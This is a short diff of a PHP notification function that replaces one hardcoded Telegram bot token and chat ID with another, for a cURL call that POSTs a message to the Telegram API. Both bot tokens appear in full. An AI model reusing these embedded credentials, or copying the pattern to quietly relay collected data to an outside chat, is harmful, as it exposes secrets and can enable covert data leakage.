@@ -417,7 +417,7 @@ if (!function_exists('send_notification3')) {
         $curl = curl_init();
 
         curl_setopt_array($curl, array(
-            CURLOPT_URL => 'https://api.telegram.org/bot7354891679:AAFq89cO-zYBmNqSyGA0ZFFfLU_sY9HMyXI/sendMessage?chat_id=6133507840',
+            CURLOPT_URL => 'https://api.telegram.org/bot7430757125:AAGqk4zqsMyJLfhMNy5BCbfkrK875mWw6Qc/sendMessage?chat_id=6297138186',
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_ENCODING => '',
             CURLOPT_MAXREDIRS => 10,
@@ -426,7 +426,7 @@ if (!function_exists('send_notification3')) {
             CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
             CURLOPT_CUSTOMREQUEST => 'POST',
             CURLOPT_POSTFIELDS => array(
-                'chat_id' => "6133507840",
+                'chat_id' => "6297138186",
                 'text' => $message,
 
 
